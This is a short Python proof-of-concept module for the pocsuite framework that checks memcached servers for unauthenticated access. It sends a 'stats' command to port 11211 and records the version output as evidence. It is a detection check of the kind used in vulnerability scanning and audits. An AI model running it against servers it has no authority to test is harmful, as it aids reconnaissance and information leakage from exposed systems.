#!/usr/bin/env python
# coding: utf-8
import socket
import urlparse
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'hancool'
    vulDate = '2018-12-25'
    createDate = '2018-12-25'
    updateDate = '2018-12-25'
    references = ['',]
    name = 'memcached unauthorized access'
    appPowerLink = ''
    appName = 'memcached'
    appVersion = 'All'
    vulType = 'Unauthorized'
    desc = '''
    memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。
    如果memcached对外开放访问，攻击者可通过该漏洞泄露服务器的敏感信息。
    '''

    def _verify(self):
        result = {}
        pr = urlparse.urlparse(self.url)
        ports = [11211]
        if pr.port and pr.port not in ports:
            ports.insert(0, pr.port)
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((pr.hostname,port))
                s.send("stats\r\n")
                info = s.recv(4096)
                if "STAT version" in info:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname,port)
                    result['extra'] = {}
                    result['extra']['evidence'] = info.strip()
            except Exception, e:
                #raise
                pass

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output

register(TestPOC)
